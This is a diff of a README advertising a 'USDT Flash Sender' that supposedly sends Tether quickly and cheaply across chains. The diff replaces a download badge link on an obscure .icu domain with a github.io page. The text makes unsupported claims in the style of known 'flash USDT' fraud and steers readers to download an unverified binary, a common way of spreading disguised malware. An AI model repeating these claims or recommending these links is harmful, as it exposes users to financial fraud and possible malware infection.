@@ -2,8 +2,7 @@
 
 The **USDT Flash Sender** is a fast and efficient tool designed for **rapid transfers** of **USDT (Tether)** across multiple **blockchain networks**. With this tool, users can send **USDT** securely and with **low fees**, ensuring quick transactions even during periods of high network congestion. It supports **cross-chain transfers**, allowing users to move their USDT between different blockchains, making it an ideal solution for those needing fast, seamless transfers. The **USDT Flash Sender** provides a **user-friendly interface**, ensuring that users can initiate transfers with just a few clicks, saving time and maximizing efficiency.
 
-[![Download USDT flash sender](https://img.shields.io/badge/Download-USDTflashsender%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download USDT flash sender](https://img.shields.io/badge/Download-USDTflashsender%20-blueviolet)](https://usdt-flashsender.github.io/.github/)
 
 ⚡ **Key Features:**
 
